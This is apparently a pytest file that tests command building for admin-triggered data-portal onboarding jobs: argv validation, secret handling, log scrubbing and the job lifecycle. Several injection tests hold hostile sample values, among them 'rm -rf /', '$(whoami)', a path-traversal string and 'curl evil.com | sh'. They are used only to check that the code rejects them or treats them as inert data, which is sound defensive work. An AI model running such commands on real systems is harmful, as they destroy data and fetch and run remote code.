"""Tests for admin-triggered portal onboarding runs.

The security-relevant property here is that admin-supplied options become
*validated argv elements*, never a shell string and never a choice of program.
"""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path

import pytest

from data_concierge.gateway import onboarding_jobs as oj

DCAT_SITE = {
    "id": "data-pa-gov",
    "name": "Pennsylvania Open Data Portal",
    "portal_type": "dcat",
    "url": "https://data.pa.gov",
}
CKAN_SITE = {
    "id": "wprdc",
    "name": "WPRDC",
    "portal_type": "ckan",
    "url": "https://data.wprdc.org",
}


class TestScriptSelection:
    def test_portal_type_picks_the_script(self):
        dcat_argv, dcat_script = oj.build_command(DCAT_SITE, {})
        ckan_argv, ckan_script = oj.build_command(CKAN_SITE, {})
        assert dcat_script == "onboard_dcat.py"
        assert ckan_script == "onboard_ckan.py"
        assert dcat_argv[0] == sys.executable
        assert dcat_argv[1].endswith("onboard_dcat.py")

    def test_caller_cannot_choose_the_program(self):
        """The script comes from the registered portal_type, so an injected
        'script' or 'portal_type' option changes nothing."""
        argv, script = oj.build_command(
            CKAN_SITE, {"script": "/bin/sh", "portal_type": "dcat", "command": "rm -rf /"}
        )
        assert script == "onboard_ckan.py"
        assert argv[0] == sys.executable
        assert not any("sh" == Path(a).name for a in argv)
        assert "rm -rf /" not in argv

    def test_unknown_portal_type_falls_back_to_ckan(self):
        _, script = oj.build_command({**CKAN_SITE, "portal_type": "socrata"}, {})
        assert script == "onboard_ckan.py"

    def test_site_id_is_taken_from_the_registry_entry(self):
        argv, _ = oj.build_command(DCAT_SITE, {})
        assert argv[argv.index("--site-id") + 1] == "data-pa-gov"


class TestOptionValidation:
    @pytest.mark.parametrize(
        "options,message",
        [
            ({"limit": 99999}, "limit"),
            ({"limit": -5}, "limit"),
            ({"concurrency": 0}, "concurrency"),
            ({"concurrency": 50}, "concurrency"),
            ({"max_mb": 0}, "max_mb"),
            ({"limit": "twelve"}, "limit"),
        ],
    )
    def test_out_of_range_numbers_are_rejected(self, options, message):
        with pytest.raises(oj.JobError) as exc:
            oj.build_command(DCAT_SITE, options)
        assert message in str(exc.value)

    @pytest.mark.parametrize(
        "value",
        ["a b", "ns; rm -rf /", "../../etc", "ns$(whoami)", "ns`id`", "n" * 100],
    )
    def test_bad_pinecone_names_are_rejected(self, value):
        with pytest.raises(oj.JobError):
            oj.build_command(DCAT_SITE, {"pinecone": True, "pinecone_namespace": value})

    def test_good_pinecone_names_pass(self):
        argv, _ = oj.build_command(
            DCAT_SITE,
            {"pinecone": True, "pinecone_namespace": "pa-test_1.0", "pinecone_index": "ckan-test"},
        )
        assert "--pinecone-namespace" in argv
        assert argv[argv.index("--pinecone-namespace") + 1] == "pa-test_1.0"

    def test_shell_metacharacters_in_free_text_stay_one_argument(self):
        """No shell is used, so a metacharacter is data, not syntax."""
        argv, _ = oj.build_command(
            DCAT_SITE, {"dataset_filter": "opioid; rm -rf / && curl evil.com | sh"}
        )
        idx = argv.index("--dataset-filter")
        assert argv[idx + 1] == "opioid; rm -rf / && curl evil.com | sh"
        assert len(argv) == idx + 2

    def test_control_characters_are_stripped_from_free_text(self):
        """A newline in the filter would forge lines in the job log."""
        argv, _ = oj.build_command(
            DCAT_SITE, {"dataset_filter": "opi\noid\r\x00 done"}
        )
        value = argv[argv.index("--dataset-filter") + 1]
        assert "\n" not in value and "\r" not in value and "\x00" not in value

    def test_free_text_is_length_capped(self):
        argv, _ = oj.build_command(DCAT_SITE, {"dataset_filter": "x" * 5000})
        assert len(argv[argv.index("--dataset-filter") + 1]) <= 200

    def test_empty_filter_is_omitted_entirely(self):
        argv, _ = oj.build_command(DCAT_SITE, {"dataset_filter": "   "})
        assert "--dataset-filter" not in argv


class TestFlagRouting:
    def test_dcat_only_flags_never_reach_the_ckan_script(self):
        """onboard_ckan.py has no --limit or --max-mb; argparse would abort."""
        argv, _ = oj.build_command(CKAN_SITE, {"limit": 5, "max_mb": 50})
        assert "--limit" not in argv
        assert "--max-mb" not in argv

    def test_dcat_flags_are_passed_for_a_dcat_portal(self):
        argv, _ = oj.build_command(DCAT_SITE, {"limit": 5, "max_mb": 50})
        assert argv[argv.index("--limit") + 1] == "5"
        assert argv[argv.index("--max-mb") + 1] == "50"

    def test_boolean_flags_map_to_switches(self):
        argv, _ = oj.build_command(
            DCAT_SITE,
            {"skip_qsv": True, "skip_download": True, "no_sync": True, "rebuild_index": True},
        )
        for flag in ("--skip-qsv", "--skip-download", "--no-sync", "--rebuild-index"):
            assert flag in argv

    def test_false_booleans_add_nothing(self):
        argv, _ = oj.build_command(DCAT_SITE, {"skip_qsv": False, "pinecone": False})
        assert "--skip-qsv" not in argv
        assert "--pinecone" not in argv

    def test_pinecone_suboptions_require_pinecone(self):
        """A namespace without --pinecone would be an unrecognised argument."""
        argv, _ = oj.build_command(
            DCAT_SITE, {"pinecone": False, "pinecone_namespace": "ns", "pinecone_dry_run": True}
        )
        assert "--pinecone-namespace" not in argv
        assert "--pinecone-dry-run" not in argv

    def test_limit_zero_means_all_and_is_omitted(self):
        argv, _ = oj.build_command(DCAT_SITE, {"limit": 0})
        assert "--limit" not in argv


class TestSecretHandling:
    def test_api_keys_never_appear_in_argv(self, monkeypatch):
        """argv is visible in `ps` and echoed into the job log, so keys go
        through the environment instead."""
        monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-v1-secretvalue")
        argv, _ = oj.build_command(DCAT_SITE, {"pinecone": True})
        joined = " ".join(argv)
        assert "sk-or-v1" not in joined
        assert "--openrouter-api-key" not in argv

    def test_log_scrubbing_redacts_provider_keys(self):
        line = "running qsv describegpt --api-key sk-or-v1-abcdef123456 --all"
        assert "sk-or-v1-abcdef123456" not in oj._scrub(line)

    def test_log_scrubbing_strips_ansi_colouring(self):
        """structlog colours its output even through a pipe; the codes would
        render literally in the admin panel's <pre>."""
        coloured = "\x1b[2m2026-01-01\x1b[0m [\x1b[32minfo\x1b[0m] catalog loaded"
        assert oj._scrub(coloured) == "2026-01-01 [info] catalog loaded"


class TestNoiseFilter:
    @pytest.mark.parametrize(
        "line",
        [
            "connect_tcp.started host='data.pa.gov' port=443",
            "receive_response_body.complete",
            "HTTP Request: GET https://data.pa.gov/data.json",
            "  close.started",
        ],
    )
    def test_connection_chatter_is_dropped(self, line):
        assert oj._is_noise(line)

    @pytest.mark.parametrize(
        "line",
        [
            "  Downloaded rates.csv (19,905 bytes)",
            "Error: download failed",
            "  Stats: 13 columns profiled",
            "Traceback (most recent call last):",
            "",
        ],
    )
    def test_real_output_is_kept(self, line):
        assert not oj._is_noise(line)


class TestJobLifecycle:
    def test_a_finished_job_record_is_json_serializable(self, tmp_path, monkeypatch):
        """Regression: the live record held the supervising asyncio Task, so
        every completed job failed to persist and vanished on restart."""
        import json

        from data_concierge.data_layer.storage import storage

        monkeypatch.setattr(storage, "root", tmp_path)

        async def run() -> dict:
            job = await oj.start_job(
                {**DCAT_SITE, "id": "data-pa-gov"},
                {"rebuild_index": True, "no_sync": True},
                started_by="pytest",
            )
            # start_job returns the public view; it must already be clean.
            json.dumps(job)
            task = oj._jobs[job["id"]].get("_task")
            if task is not None:
                await asyncio.gather(task, return_exceptions=True)
            return job

        job = asyncio.run(run())
        stored = storage.read_json(f"onboarding_jobs/{job['id']}.json")
        assert stored is not None, "the finished job was never persisted"
        json.dumps(stored)
        assert "_task" not in stored

    def test_public_view_hides_internal_fields(self):
        record = oj._public({"id": "x", "_task": object(), "status": "running"})
        assert record == {"id": "x", "status": "running"}

    def test_list_view_omits_logs(self):
        summary = oj._summary({"id": "x", "log": ["a", "b"], "status": "succeeded"})
        assert "log" not in summary

    def test_missing_job_returns_none(self, tmp_path, monkeypatch):
        from data_concierge.data_layer.storage import storage

        monkeypatch.setattr(storage, "root", tmp_path)
        assert oj.get_job("does-not-exist") is None

    def test_cancel_of_unknown_job_is_false(self):
        assert asyncio.run(oj.cancel_job("nope")) is False

    def test_a_job_left_running_by_a_restart_is_reported_as_interrupted(
        self, tmp_path, monkeypatch
    ):
        """A record that says 'running' with no process behind it did not
        survive a restart; showing it as running would be a lie."""
        from data_concierge.data_layer.storage import storage

        monkeypatch.setattr(storage, "root", tmp_path)
        monkeypatch.setattr(oj, "_jobs", {})
        storage.write_json(
            "onboarding_jobs/ghost.json",
            {"id": "ghost", "status": "running", "started_at": "2026-01-01T00:00:00Z"},
        )
        record = oj.get_job("ghost")
        assert record["status"] == oj.STATUS_FAILED
        assert "interrupted" in record["error"]


class TestRuntimeWarnings:
    def test_missing_qsv_is_reported(self, monkeypatch):
        monkeypatch.setattr(oj.shutil, "which", lambda name: None)
        assert any("qsv" in w for w in oj.runtime_warnings())

    def test_cloud_run_lifetime_is_reported(self, monkeypatch):
        monkeypatch.setenv("K_SERVICE", "data-concierge")
        warnings = oj.runtime_warnings()
        assert any("Cloud Run" in w for w in warnings)

    def test_scripts_are_found_in_a_checkout(self):
        directory = oj.scripts_dir()
        assert directory is not None
        assert (directory / "onboard_dcat.py").exists()
        assert (directory / "onboard_ckan.py").exists()
